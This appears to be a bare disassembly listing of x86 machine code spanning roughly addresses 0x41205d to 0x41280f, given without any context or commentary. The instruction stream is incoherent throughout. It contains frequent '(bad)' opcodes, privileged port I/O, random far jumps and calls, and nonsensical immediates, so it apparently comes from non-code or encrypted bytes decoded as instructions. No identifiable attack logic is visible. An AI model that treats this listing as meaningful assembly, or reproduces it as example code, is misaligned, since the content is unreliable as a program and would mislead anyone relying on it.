  41205d:	imul   ecx,DWORD PTR [ebp-0x3c],0xbe05e31f
  412064:	fcmovnu st,st(1)
  412066:	stc    
  412067:	inc    esi
  412068:	cmp    al,0x92
  41206a:	add    BYTE PTR [ebx],ch
  41206c:	outs   dx,BYTE PTR ds:[esi]
  41206d:	mov    eax,0xc6be6140
  412072:	dec    esp
  412073:	sub    esi,DWORD PTR [eax]
  412075:	ins    BYTE PTR es:[edi],dx
  412076:	(bad)  
  412078:	push   0xffffffe5
  41207a:	mov    DWORD PTR [ebx],esi
  41207c:	mov    dl,0x9b
  41207e:	jne    0x412015
  412080:	loop   0x412042
  412082:	push   edi
  412083:	imul   ecx,eax,0xade3fef
  412089:	mov    esp,0x279b81eb
  41208e:	arpl   WORD PTR [ebx],cx
  412090:	push   es
  412091:	jbe    0x4120e6
  412093:	out    dx,eax
  412094:	(bad)  
  412095:	in     eax,dx
  412096:	(bad)  
  412097:	sbb    ecx,DWORD PTR [ecx+0x3a]
  41209a:	test   al,0x83
  41209c:	sub    BYTE PTR [ebx-0x364c02d5],bh
  4120a2:	aaa    
  4120a3:	out    0x9a,al
  4120a5:	sub    eax,0xef33bd8d
  4120aa:	(bad)  
  4120ab:	in     al,dx
  4120ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120ad:	push   esp
  4120ae:	test   DWORD PTR [ebx],edi
  4120b0:	xor    eax,0xd04de8ee
  4120b5:	xor    al,0xfc
  4120b7:	sbb    al,0x8c
  4120b9:	sahf   
  4120ba:	in     ax,0x7f
  4120bd:	icebp  
  4120be:	(bad)  
  4120c0:	stos   BYTE PTR es:[edi],al
  4120c1:	int    0xf6
  4120c3:	lods   eax,DWORD PTR ds:[esi]
  4120c5:	popf   
  4120c6:	ret    
  4120c7:	mov    ebx,0x9bc653da
  4120cc:	or     DWORD PTR [eax],0x2d8c10f7
  4120d2:	sti    
  4120d3:	rcr    BYTE PTR [eax],0xa4
  4120d6:	jge    0x41208e
  4120d8:	and    BYTE PTR [eax-0x29],dl
  4120db:	ins    DWORD PTR es:[edi],dx
  4120dc:	and    DWORD PTR [esi+0x4c],ebp
  4120df:	inc    edi
  4120e0:	push   ecx
  4120e1:	xchg   ecx,eax
  4120e2:	push   0x6
  4120e4:	outs   dx,BYTE PTR ds:[esi]
  4120e5:	nop
  4120e6:	or     eax,0x91dc449f
  4120eb:	xor    BYTE PTR [edi-0x1c],bh
  4120ee:	jecxz  0x412136
  4120f0:	fld    QWORD PTR [bx+si]
  4120f3:	jne    0x41214c
  4120f5:	xchg   ebx,ecx
  4120f7:	dec    edx
  4120f8:	ret    0x7f81
  4120fb:	or     bh,dh
  4120fd:	pushf  
  4120fe:	push   cs
  4120ff:	push   0x14
  412101:	xor    bh,BYTE PTR [ecx]
  412103:	dec    ebp
  412104:	mov    ch,0x1b
  412106:	or     ch,BYTE PTR [esi]
  412108:	mov    ds:0x403c802b,al
  41210d:	cmp    ch,ah
  41210f:	pusha  
  412110:	(bad)  
  412111:	sbb    ecx,ecx
  412113:	xchg   edi,eax
  412114:	cmp    ecx,DWORD PTR [ebx]
  412116:	and    esi,DWORD PTR [edi+0x2]
  412119:	or     al,0x9b
  41211b:	push   eax
  41211c:	mov    dh,0x99
  41211e:	lahf   
  41211f:	bound  ebx,QWORD PTR [eax]
  412121:	pop    es
  412122:	jno    0x41211e
  412124:	shr    DWORD PTR [esi+0xf],1
  412127:	shl    BYTE PTR ds:0x7d376bbd,1
  41212d:	mov    eax,ds:0x1f83c254
  412132:	es mov bh,0x3
  412135:	cdq    
  412136:	sub    eax,0x8a1e9557
  41213b:	div    DWORD PTR [eax-0x3d91ce94]
  412141:	inc    esp
  412142:	and    DWORD PTR es:[ecx-0x4c],edx
  412146:	aaa    
  412147:	je     0x41219e
  412149:	in     al,dx
  41214a:	add    edx,ebx
  41214c:	push   cs
  41214d:	xchg   edx,eax
  41214e:	sub    ecx,DWORD PTR [ecx]
  412150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412151:	dec    edx
  412152:	out    0x8a,al
  412154:	inc    eax
  412155:	dec    eax
  412156:	inc    ebp
  412157:	jl     0x412199
  412159:	aam    0xd5
  41215b:	adc    al,0xf0
  41215d:	call   FWORD PTR [eax-0x76]
  412160:	or     ebx,DWORD PTR [edx]
  412162:	test   DWORD PTR [esi],esi
  412164:	test   eax,0xf5129281
  412169:	push   eax
  41216a:	(bad)  
  41216b:	pop    edi
  41216c:	dec    edx
  41216d:	scas   eax,DWORD PTR es:[edi]
  41216e:	jbe    0x412155
  412170:	mov    ebx,0x71e3c494
  412175:	add    dh,BYTE PTR [eax+0x43]
  412178:	cmp    esi,DWORD PTR [edx]
  41217a:	jmp    0x412144
  41217c:	adc    DWORD PTR [ebp-0x42826cd0],0x1b
  412183:	test   esp,ecx
  412185:	mov    ebp,0x15d538b5
  41218a:	test   DWORD PTR [ebx-0x1b57efa1],ecx
  412190:	cdq    
  412191:	xchg   edi,eax
  412192:	pop    ebp
  412193:	js     0x4121c4
  412195:	cmp    BYTE PTR [ecx],ah
  412197:	mov    al,ds:0x3f58c0cf
  41219c:	add    DWORD PTR [ebp-0x48964171],edi
  4121a2:	jbe    0x4121c5
  4121a4:	dec    edx
  4121a5:	push   eax
  4121a6:	mov    BYTE PTR [ebx+ebp*2+0x5a65a7fd],al
  4121ad:	adc    BYTE PTR [esi],0xcf
  4121b0:	inc    esi
  4121b1:	and    cl,BYTE PTR [edx-0x404158d5]
  4121b7:	je     0x4121ba
  4121b9:	or     ebx,ebx
  4121bb:	shl    DWORD PTR [edx-0x10],1
  4121be:	out    0x57,eax
  4121c0:	add    eax,0xe06ea2ee
  4121c5:	dec    ecx
  4121c6:	and    eax,0x2842338a
  4121cb:	adc    bh,bl
  4121cd:	cdq    
  4121ce:	and    al,0xd8
  4121d0:	sub    DWORD PTR [edi-0x6],ebx
  4121d3:	add    esi,edi
  4121d5:	xor    al,0x7b
  4121d7:	push   eax
  4121d8:	inc    eax
  4121d9:	arpl   WORD PTR [esi-0x49],ax
  4121dc:	sbb    DWORD PTR [ebx],edi
  4121de:	jno    0x41221a
  4121e0:	adc    edx,0x59
  4121e3:	popf   
  4121e4:	add    ecx,DWORD PTR [edx]
  4121e6:	sub    DWORD PTR [esi],edx
  4121e8:	mov    ebp,0xf3c50692
  4121ed:	test   al,0x98
  4121ef:	(bad)  
  4121f1:	nop
  4121f2:	mov    esp,0xcfa69f54
  4121f7:	pop    edx
  4121f8:	add    eax,0x73ae599b
  4121fd:	mov    cl,0xc5
  4121ff:	fwait
  412200:	jbe    0x412202
  412202:	dec    edi
  412203:	push   DWORD PTR [eax-0x45ebe2f4]
  412209:	outs   dx,BYTE PTR ds:[esi]
  41220a:	lock pop ebx
  41220c:	mov    WORD PTR [edi+edx*8+0x68],ss
  412210:	mov    ecx,0xece0dbbe
  412215:	or     BYTE PTR [esi+0x132c6570],bl
  41221b:	jge    0x41223d
  41221d:	cmp    al,0x92
  41221f:	cmp    eax,eax
  412221:	ret    
  412222:	(bad)  
  412223:	fld    st(4)
  412225:	sti    
  412226:	idiv   DWORD PTR [edi+edx*8-0x2b]
  41222a:	jmp    DWORD PTR [ebp+0x6ce9cfc0]
  412230:	dec    ebx
  412231:	dec    ebx
  412232:	inc    edi
  412233:	aam    0x69
  412235:	jb     0x412220
  412237:	and    al,0xf3
  412239:	shl    BYTE PTR [ebp-0x780ae24c],1
  41223f:	sub    eax,0x16df5e0a
  412244:	(bad)  
  412245:	mov    dh,0x39
  412247:	sbb    eax,0x82d94210
  41224c:	xchg   ebx,eax
  41224d:	jo     0x412287
  41224f:	inc    esi
  412250:	pop    es
  412251:	dec    eax
  412252:	jbe    0x4121ef
  412254:	sahf   
  412255:	fidivr DWORD PTR ds:0x13849278
  41225b:	mov    edi,0xd21df031
  412260:	enter  0xe074,0x17
  412264:	xchg   esi,eax
  412265:	mov    bh,0x25
  412267:	xor    al,0xf3
  412269:	push   0xffffff8a
  41226b:	aad    0x9c
  41226d:	out    0xa5,al
  41226f:	inc    esi
  412270:	stos   BYTE PTR es:[edi],al
  412271:	loopne 0x41227f
  412273:	(bad)  
  412274:	call   0xc337ed1f
  412279:	mov    ch,0x15
  41227b:	and    al,0x3
  41227d:	xchg   DWORD PTR [ecx],ebp
  41227f:	lock mov ds:0xa4f9e40d,al
  412285:	fmul   DWORD PTR [edx+0x82efa32]
  41228b:	loope  0x412211
  41228d:	dec    esi
  41228e:	loop   0x41230b
  412290:	int3   
  412291:	xchg   ecx,eax
  412292:	mov    edi,0x68fb8fcd
  412297:	scas   eax,DWORD PTR es:[edi]
  412298:	sub    DWORD PTR ds:0xc8d014c1,ecx
  41229e:	inc    ecx
  41229f:	fisubr WORD PTR [ebx]
  4122a1:	dec    ebx
  4122a2:	dec    eax
  4122a3:	stc    
  4122a4:	mov    fs,WORD PTR [ebx+ebp*1+0x2b796f46]
  4122ab:	sbb    al,0xdf
  4122ad:	push   cs
  4122ae:	mov    bl,0x32
  4122b0:	rcl    ah,0xd0
  4122b3:	sbb    dh,ch
  4122b5:	inc    edx
  4122b6:	sbb    al,0x25
  4122b8:	push   ebp
  4122b9:	shl    BYTE PTR [eax-0x3b48d97d],0xca
  4122c0:	xchg   DWORD PTR [ecx],ebx
  4122c2:	xchg   esi,eax
  4122c3:	sbb    eax,0x76a0d851
  4122c8:	mov    bl,0xcf
  4122ca:	imul   ecx,DWORD PTR [ecx],0xffffff8d
  4122cd:	in     al,0xc0
  4122cf:	and    esp,edx
  4122d1:	in     eax,0x9f
  4122d3:	xor    al,0x95
  4122d5:	adc    BYTE PTR [ecx+eax*8],0x2f
  4122d9:	and    al,0xf7
  4122db:	pop    esp
  4122dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122dd:	ins    DWORD PTR es:[edi],dx
  4122de:	jb     0x4122d8
  4122e0:	mov    dl,BYTE PTR [esi-0x5d7ab978]
  4122e6:	enter  0xee40,0xb5
  4122ea:	pop    ds
  4122eb:	xchg   DWORD PTR [esi-0x11ed45a0],ebx
  4122f1:	pop    ds
  4122f2:	mov    bh,0x7a
  4122f4:	mov    ds:0x7c56e779,eax
  4122f9:	addr16 pop eax
  4122fb:	adc    cl,BYTE PTR [eax]
  4122fd:	mov    ebp,edi
  4122ff:	xor    eax,0x3f162be6
  412304:	mov    ds:0xcf1280ee,eax
  412309:	sub    DWORD PTR [ebx-0x7e],esi
  41230c:	ds sahf 
  41230e:	mov    edx,0x16d73641
  412313:	mov    dl,0x80
  412315:	iret   
  412316:	outs   dx,BYTE PTR ds:[esi]
  412317:	jge    0x412374
  412319:	xor    dl,BYTE PTR [edi+0x40]
  41231c:	or     eax,0x5f4efc55
  412321:	sar    BYTE PTR [esi-0x5340ae6],1
  412327:	lock in eax,dx
  412329:	addr16 aam 0x3
  41232c:	stos   BYTE PTR es:[edi],al
  41232d:	add    BYTE PTR ds:0xc91d9962,0x9b
  412334:	popf   
  412335:	out    dx,al
  412336:	js     0x4123a2
  412338:	(bad)  
  412339:	call   0x44abcc04
  41233e:	dec    esi
  41233f:	pop    esp
  412340:	add    al,BYTE PTR [esi]
  412342:	cmc    
  412343:	scas   al,BYTE PTR es:[edi]
  412344:	push   ebp
  412345:	(bad)  
  412347:	test   eax,0xf18462ed
  41234c:	fild   WORD PTR [edi]
  41234e:	(bad)  
  412350:	sub    al,0x27
  412352:	dec    esi
  412353:	cmp    al,0xd9
  412355:	repnz pop ds
  412357:	sub    BYTE PTR [ecx-0x717ac4fc],bl
  41235d:	or     DWORD PTR [ecx-0xef5b985],ebp
  412363:	cmp    edx,DWORD PTR [ebx+0x66]
  412366:	and    eax,0x83aa4ee0
  41236b:	and    BYTE PTR [esi+0x624f108],bh
  412371:	repz adc esp,edi
  412374:	jl     0x412398
  412376:	fld    QWORD PTR [edi-0x15]
  412379:	add    al,0x4e
  41237b:	inc    ebp
  41237c:	bound  edi,QWORD PTR [esi+0x48]
  41237f:	loope  0x412373
  412381:	gs std 
  412383:	inc    ebx
  412384:	ffreep st(0)
  412386:	(bad)  
  412387:	push   ds
  412388:	aam    0xc4
  41238a:	lds    ebp,FWORD PTR [ebx+0x314be73f]
  412390:	icebp  
  412391:	and    BYTE PTR [edx-0xb8c],bh
  412397:	dec    esp
  412398:	jnp    0x4123d6
  41239a:	dec    ebx
  41239b:	leave  
  41239c:	loope  0x4123d9
  41239e:	xchg   esi,eax
  41239f:	mov    al,0x32
  4123a1:	daa    
  4123a2:	aaa    
  4123a3:	shl    al,0xce
  4123a6:	leave  
  4123a7:	sahf   
  4123a8:	jge    0x412343
  4123aa:	mov    esp,0xb68b8069
  4123af:	dec    eax
  4123b0:	aad    0x26
  4123b2:	and    cl,BYTE PTR [esi+esi*2-0x45741b9a]
  4123b9:	push   edi
  4123ba:	mov    dl,0x22
  4123bc:	sbb    al,0xa8
  4123be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123bf:	dec    edi
  4123c0:	inc    ebx
  4123c1:	iret   
  4123c2:	bound  edx,QWORD PTR [edi+ecx*1+0x1f]
  4123c6:	inc    ebp
  4123c7:	enter  0xcdcd,0x8f
  4123cb:	adc    al,0x31
  4123cd:	push   ebp
  4123ce:	sar    DWORD PTR [esi-0x5e695829],cl
  4123d4:	bound  ebp,QWORD PTR [esi-0x1b]
  4123d7:	stos   BYTE PTR es:[edi],al
  4123d8:	cmc    
  4123d9:	retf   0xff69
  4123dc:	iret   
  4123dd:	hlt    
  4123de:	mov    eax,ds:0x77d01b6d
  4123e3:	pop    edi
  4123e4:	int    0xb7
  4123e6:	xchg   ebp,eax
  4123e7:	clc    
  4123e8:	cli    
  4123e9:	jno    0x412419
  4123eb:	gs je  0x4123f8
  4123ee:	loopne 0x4123f4
  4123f0:	jle    0x41240d
  4123f2:	xor    BYTE PTR [ebx],bh
  4123f4:	test   eax,0xc34a18ae
  4123f9:	jne    0x4123a0
  4123fb:	push   ds
  4123fc:	sahf   
  4123fd:	jnp    0x41243d
  4123ff:	xor    eax,0x2637e1d0
  412404:	jle    0x4123d5
  412406:	jmp    0x412391
  412408:	(bad)  
  412409:	and    bh,bl
  41240b:	rol    bl,1
  41240d:	pop    es
  41240e:	jno    0x41246f
  412410:	push   0x7e
  412412:	stc    
  412413:	test   eax,0xd8d05574
  412418:	pop    es
  412419:	out    0xda,al
  41241b:	(bad)  
  41241c:	mov    al,ds:0xc4a947a2
  412421:	xchg   ecx,eax
  412422:	iret   
  412423:	out    0x46,eax
  412425:	lahf   
  412426:	inc    edx
  412427:	outs   dx,DWORD PTR ds:[esi]
  412428:	mov    esp,0xffa3312c
  41242d:	cmp    ch,BYTE PTR [eax]
  41242f:	add    BYTE PTR [esp+ebx*2-0x70e55c20],0x69
  412437:	addr16 repnz in eax,0x6a
  41243b:	pop    ecx
  41243c:	sbb    dh,BYTE PTR [ebx]
  41243e:	dec    edx
  41243f:	mov    ebp,0x4c0f9958
  412444:	mul    BYTE PTR [edi+eax*1-0x245c406b]
  41244b:	outs   dx,DWORD PTR ds:[esi]
  41244c:	int    0x97
  41244e:	mov    dh,0x4c
  412450:	arpl   WORD PTR [edx-0x38],cx
  412453:	stos   BYTE PTR es:[edi],al
  412454:	or     DWORD PTR [eax+0x523a054c],eax
  41245a:	aam    0x51
  41245c:	fld    QWORD PTR [ebp-0x459afb5d]
  412462:	xor    ch,BYTE PTR [bp+di+0x5912]
  412467:	loop   0x412456
  412469:	loopne 0x412473
  41246b:	in     al,0x5b
  41246d:	jb     0x4124a2
  41246f:	mov    edx,0xa954fee0
  412474:	adc    edx,DWORD PTR [edi]
  412476:	(bad)  
  412477:	adc    bl,dh
  412479:	xchg   esp,eax
  41247a:	mov    esi,esi
  41247c:	data16 lods al,BYTE PTR ds:[esi]
  41247e:	int3   
  41247f:	and    eax,DWORD PTR [esi]
  412481:	mov    esp,0xf2dc4980
  412486:	jecxz  0x412462
  412488:	sahf   
  412489:	lods   al,BYTE PTR ds:[esi]
  41248a:	add    BYTE PTR [ecx],bl
  41248c:	out    0x37,eax
  41248e:	dec    ecx
  41248f:	or     dh,BYTE PTR [ebx]
  412491:	sub    ch,bh
  412493:	add    al,0xf7
  412495:	and    DWORD PTR [eax-0x3a],esi
  412498:	scas   al,BYTE PTR es:[edi]
  412499:	mov    esi,0xe1b4c933
  41249e:	lds    ebp,FWORD PTR [edi-0x23f734f2]
  4124a4:	ja     0x4124f7
  4124a6:	jecxz  0x4124f7
  4124a8:	mov    esp,DWORD PTR [edi]
  4124aa:	pop    ecx
  4124ab:	(bad)  
  4124ac:	pop    ds
  4124ad:	add    al,0xdf
  4124af:	in     eax,dx
  4124b0:	push   0xffffffdf
  4124b2:	mov    BYTE PTR [ecx-0x33],cl
  4124b5:	repnz retf 0x2e8d
  4124b9:	in     eax,0xf7
  4124bb:	dec    edx
  4124bc:	fist   WORD PTR [esi-0xdf1a0cb]
  4124c2:	inc    esp
  4124c3:	fisub  DWORD PTR ds:0xf9a170fc
  4124c9:	push   0xbb9ae65b
  4124ce:	dec    esi
  4124cf:	enter  0xdae1,0x39
  4124d3:	mov    ds:0x6c5f3629,eax
  4124d8:	mov    ds:0x9d9de73c,eax
  4124dd:	sbb    eax,0xe9e460c
  4124e2:	sub    BYTE PTR [esi-0x5ed5ce54],cl
  4124e8:	ss cmp al,0x2e
  4124eb:	xchg   ebx,eax
  4124ec:	pop    ds
  4124ed:	adc    DWORD PTR [ebp-0x1c],edx
  4124f0:	retf   
  4124f1:	int    0x8f
  4124f3:	js     0x412554
  4124f5:	jne    0x412555
  4124f7:	(bad)  
  4124f8:	pop    si
  4124fa:	stc    
  4124fb:	sbb    BYTE PTR [ebx+0x58a6acbf],al
  412501:	repz push ss
  412503:	mov    ds:0x71bd80f8,eax
  412508:	dec    edi
  412509:	in     al,0x55
  41250b:	mov    dl,al
  41250d:	aad    0xa2
  41250f:	popa   
  412510:	cmovno eax,DWORD PTR [edi]
  412513:	adc    DWORD PTR [ebp+0x2bd68ae8],0xffffffb6
  41251a:	xor    BYTE PTR [edi+eiz*4-0x66],0x4b
  41251f:	call   0xb3ed37c6
  412524:	and    ecx,edx
  412526:	(bad)  
  412528:	mul    BYTE PTR [esi+0x5d]
  41252b:	not    DWORD PTR [eax+edx*2]
  41252e:	cmp    eax,0x53
  412531:	cwde   
  412532:	(bad)  
  412533:	mul    BYTE PTR [edx-0x12f4d105]
  412539:	mov    dl,BYTE PTR [ebp+0x5fcbd92e]
  41253f:	xchg   esi,eax
  412540:	in     al,0xd0
  412542:	mov    ebx,0xeec93ffc
  412547:	pop    ds
  412548:	ret    
  412549:	mov    cl,0xdb
  41254b:	in     al,0xb6
  41254d:	xor    DWORD PTR [ecx],0xffffffa1
  412550:	cmp    BYTE PTR [ebx-0x78],dh
  412553:	inc    ecx
  412554:	sub    BYTE PTR [ebx-0x66],0xe0
  412558:	leave  
  412559:	xrelease xchg BYTE PTR [edi],ah
  41255c:	xchg   ecx,eax
  41255d:	jns    0x41251f
  41255f:	sub    BYTE PTR [ebp+0x7b4bbbb5],bh
  412565:	arpl   WORD PTR [esi-0x2b],ax
  412568:	lods   eax,DWORD PTR ds:[esi]
  412569:	hlt    
  41256a:	push   ebp
  41256b:	popf   
  41256c:	and    edi,DWORD PTR [eax]
  41256e:	sub    DWORD PTR ds:[edi-0x12],ebp
  412572:	xor    al,0xc3
  412574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412575:	(bad)  
  412576:	lds    ebp,FWORD PTR [esi]
  412578:	adc    ebx,DWORD PTR [esi]
  41257a:	cmp    al,0x45
  41257c:	xchg   ebp,eax
  41257d:	in     al,0x15
  41257f:	jns    0x4125c3
  412581:	push   cs
  412582:	and    eax,edx
  412584:	dec    edi
  412585:	fadd   st,st(5)
  412587:	mov    dh,0x76
  412589:	sar    DWORD PTR [ebx+esi*8-0x1f],0xcd
  41258e:	(bad)  
  41258f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412590:	adc    edx,ecx
  412592:	sub    ebp,0xfa7f5305
  412598:	js     0x412596
  41259a:	enter  0xdca6,0xec
  41259e:	mov    bl,0x8e
  4125a0:	jne    0x4125ca
  4125a2:	bound  ecx,QWORD PTR [ecx+0x4b]
  4125a5:	cmp    al,0xf4
  4125a7:	in     eax,dx
  4125a8:	nop
  4125a9:	cmp    ah,0x9b
  4125ac:	je     0x412534
  4125ae:	mov    edi,0x2d035932
  4125b3:	fxch   st(2)
  4125b5:	sbb    BYTE PTR [esi-0x4c],bh
  4125b8:	sbb    eax,0x9faeff01
  4125bd:	je     0x412548
  4125bf:	cli    
  4125c0:	inc    ebx
  4125c1:	repnz pushf 
  4125c3:	sbb    DWORD PTR [ecx],esp
  4125c5:	dec    eax
  4125c6:	sub    BYTE PTR [edx-0x3a35ad09],bl
  4125cc:	pop    eax
  4125cd:	inc    esi
  4125ce:	sar    esi,1
  4125d0:	mov    ds:0x5f4a1903,eax
  4125d5:	hlt    
  4125d6:	inc    edx
  4125d7:	jo     0x41260b
  4125d9:	jo     0x41263d
  4125db:	add    DWORD PTR ds:0x5e539ecb,esi
  4125e1:	nop
  4125e2:	test   BYTE PTR [eax-0x18],bl
  4125e5:	retf   0x9296
  4125e8:	pop    esi
  4125e9:	push   ebx
  4125ea:	in     eax,dx
  4125eb:	jbe    0x412578
  4125ed:	xlat   BYTE PTR ds:[ebx]
  4125ee:	xor    ecx,eax
  4125f0:	mov    edi,0xe373b417
  4125f5:	inc    ebx
  4125f6:	add    al,0xb0
  4125f8:	jge    0x4125e5
  4125fa:	data16 jnp 0x41261e
  4125fd:	mov    eax,ds:0x6a98873
  412602:	repnz or eax,0xa517254e
  412608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41260a:	in     al,dx
  41260b:	add    bl,BYTE PTR [ebx]
  41260d:	cmp    eax,0xd77d8690
  412612:	out    0x1c,eax
  412614:	xor    cl,dh
  412616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412617:	add    ecx,DWORD PTR [eax-0xd]
  41261a:	nop
  41261b:	sbb    DWORD PTR [edx+esi*1],edx
  41261e:	(bad)  
  41261f:	gs daa 
  412621:	imul   edi,DWORD PTR [ebp+esi*8+0xbcd2fe2],0xffffffab
  412629:	(bad)  
  41262a:	xor    ecx,esi
  41262c:	push   cs
  41262d:	cli    
  41262e:	cli    
  41262f:	ins    BYTE PTR es:[edi],dx
  412630:	and    al,0x2b
  412632:	and    BYTE PTR [edx+eax*8],dh
  412635:	in     al,dx
  412636:	jbe    0x4125e0
  412638:	(bad)  
  412639:	or     eax,0xe6e7446d
  41263e:	fsub   DWORD PTR gs:0x961c9dda
  412645:	mov    ebx,0x1749dece
  41264a:	push   ebx
  41264b:	push   edi
  41264c:	int    0x67
  41264e:	add    eax,0x82e52502
  412653:	and    edx,DWORD PTR [ebx+0x79]
  412656:	xchg   edx,eax
  412657:	or     al,BYTE PTR [edi-0x28]
  41265a:	ins    DWORD PTR es:[edi],dx
  41265b:	jns    0x412616
  41265d:	jne    0x412645
  41265f:	addr16 out 0x8d,eax
  412662:	inc    ebp
  412663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412664:	and    eax,0x3c4e247e
  41266a:	and    dh,BYTE PTR [esi]
  41266c:	cld    
  41266d:	adc    eax,0xdc7f2150
  412672:	in     al,dx
  412673:	mov    ch,0xe3
  412675:	scas   al,BYTE PTR es:[edi]
  412676:	inc    edi
  412677:	or     eax,0xf7ecea00
  41267c:	mov    WORD PTR [edx-0x5a],es
  41267f:	ret    
  412680:	xchg   BYTE PTR ds:[ebx],al
  412683:	inc    ebx
  412684:	pop    edx
  412685:	push   ecx
  412686:	jge    0x412660
  412688:	mov    ecx,0xdcfafdba
  41268d:	test   al,0x6c
  41268f:	add    DWORD PTR [ecx-0x77e312bf],edx
  412695:	sbb    BYTE PTR [esi+0x690f1c2b],bl
  41269b:	mov    gs:0xcda43233,al
  4126a1:	and    DWORD PTR [edi+0xf],edi
  4126a4:	loopne 0x4126bb
  4126a6:	inc    eax
  4126a7:	int3   
  4126a8:	mov    bl,0xc1
  4126aa:	or     eax,0x277aa2c9
  4126af:	xor    dh,0xa7
  4126b2:	aaa    
  4126b3:	adc    bl,BYTE PTR [ebx]
  4126b5:	sbb    eax,0xf8b2a3dc
  4126ba:	bound  esi,QWORD PTR [edi+0x49]
  4126bd:	fstp   QWORD PTR [edx+eax*8+0x5a]
  4126c1:	adc    eax,0x6b1f7359
  4126c6:	int    0xdc
  4126c8:	lahf   
  4126c9:	inc    ebp
  4126ca:	fcomp  DWORD PTR [ebx+0x7e]
  4126cd:	jecxz  0x41265f
  4126cf:	jb     0x4126bd
  4126d1:	in     al,0x83
  4126d3:	stos   DWORD PTR es:[edi],eax
  4126d4:	lock jne 0x412680
  4126d7:	push   ds
  4126d8:	pop    esp
  4126d9:	rcr    DWORD PTR [edx+0x36],1
  4126dc:	xchg   edx,eax
  4126dd:	sub    al,0x92
  4126df:	sub    dl,ah
  4126e1:	imul   esp,ecx,0xac9a017
  4126e7:	cli    
  4126e8:	mov    ch,0xa3
  4126ea:	pop    es
  4126eb:	(bad)  
  4126ec:	cmp    BYTE PTR ss:[ecx],cl
  4126ef:	das    
  4126f0:	lods   eax,DWORD PTR ds:[esi]
  4126f1:	cmp    BYTE PTR [ebp-0x4e],ah
  4126f4:	jl     0x412741
  4126f6:	cmc    
  4126f7:	imul   edx,DWORD PTR ds:[edx],0xc892deed
  4126fe:	push   ebx
  4126ff:	jmp    0x41272c
  412701:	push   0xffffffc6
  412703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412704:	lock jmp 0x19cd75c1
  41270a:	sub    ch,dh
  41270c:	add    eax,0x613586fc
  412711:	int3   
  412712:	xor    al,0x9d
  412714:	mov    esp,0x87b8c6bc
  412719:	and    eax,DWORD PTR [edi-0x4ec789b9]
  41271f:	jmp    0x8bd0:0x45f59aa7
  412726:	dec    esp
  412727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412728:	jmp    0x88866e24
  41272d:	sub    BYTE PTR [edx],bh
  41272f:	and    al,0x33
  412731:	jecxz  0x412753
  412733:	call   0x5a84:0xb06e43bc
  41273a:	and    ebp,DWORD PTR [ebx-0x60]
  41273d:	lods   eax,DWORD PTR ds:[esi]
  41273e:	ds nop
  412740:	sub    BYTE PTR [ebx+0x1a],cl
  412743:	xlat   BYTE PTR ds:[ebx]
  412744:	or     al,0xad
  412746:	retf   0xc0c3
  412749:	adc    BYTE PTR [edx+eiz*4-0x238bdaf],dl
  412750:	mov    dl,0x1f
  412752:	adc    al,0xfd
  412754:	mov    esp,0xd787c3e5
  412759:	xchg   ecx,eax
  41275a:	add    BYTE PTR [edi-0x3a29bc78],al
  412760:	stos   BYTE PTR es:[edi],al
  412761:	xchg   esi,eax
  412762:	data16 rcl BYTE PTR [ecx+0x15],1
  412766:	jp     0x4127c6
  412768:	adc    bl,BYTE PTR [esi-0x80]
  41276b:	ds stos DWORD PTR es:[edi],eax
  41276d:	sub    bh,BYTE PTR [esi+ebp*4+0x52c23180]
  412774:	fdiv   DWORD PTR ds:0x688e594e
  41277a:	call   0xc3b8:0x9958582e
  412781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412782:	push   ebx
  412783:	push   cs
  412784:	into   
  412785:	ins    BYTE PTR es:[edi],dx
  412786:	add    esp,DWORD PTR [ecx+0x7a]
  412789:	push   edx
  41278a:	inc    ecx
  41278b:	xor    esp,ecx
  41278d:	sahf   
  41278e:	pop    esp
  41278f:	push   ebp
  412790:	and    al,BYTE PTR [edx]
  412792:	clc    
  412793:	pushw  0xffc2
  412796:	retf   0x60ad
  412799:	mov    al,0x7a
  41279b:	mov    ebx,0x98a7c559
  4127a0:	lahf   
  4127a1:	rol    BYTE PTR [ecx-0x5b],0xf2
  4127a5:	adc    BYTE PTR ds:0x5567942e,ah
  4127ab:	enter  0x7a1e,0xa0
  4127af:	dec    edi
  4127b0:	lods   al,BYTE PTR ds:[esi]
  4127b1:	mov    dh,0x48
  4127b3:	inc    ebx
  4127b4:	pop    esp
  4127b5:	inc    ecx
  4127b6:	or     al,0xbb
  4127b8:	jne    0x41274a
  4127ba:	retf   
  4127bb:	jae    0x41283c
  4127bd:	or     BYTE PTR [edx+0xe65c4ca],bh
  4127c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127c4:	fld    st(0)
  4127c6:	push   eax
  4127c7:	push   ebp
  4127c8:	sahf   
  4127c9:	xor    DWORD PTR [ebx+esi*4-0x73b5b541],ecx
  4127d0:	push   ss
  4127d1:	scas   eax,DWORD PTR es:[edi]
  4127d2:	dec    esp
  4127d3:	scas   al,BYTE PTR es:[edi]
  4127d4:	mov    ebx,0xd6b0ee41
  4127d9:	mov    ebp,0x55e1630e
  4127de:	(bad)  
  4127df:	iret   
  4127e0:	and    esp,DWORD PTR [ebp-0x4b]
  4127e3:	popa   
  4127e4:	aam    0xc5
  4127e6:	fld    st(1)
  4127e8:	ds es inc ebx
  4127eb:	push   0xed61df43
  4127f0:	dec    edx
  4127f1:	test   BYTE PTR [esp+ebp*2],ch
  4127f4:	add    BYTE PTR [ecx+0x40],ch
  4127f7:	inc    esi
  4127f8:	(bad)
  4127fc:	fcomi  st,st(3)
  4127fe:	icebp  
  4127ff:	sub    ecx,DWORD PTR [edx]
  412801:	cmp    eax,esp
  412803:	js     0x41283a
  412805:	lds    eax,FWORD PTR [eax]
  412807:	or     ah,BYTE PTR [eax+0x2278b63b]
  41280d:	sysenter 
  41280f:	adc    DWORD PTR [eax-0x35],eax
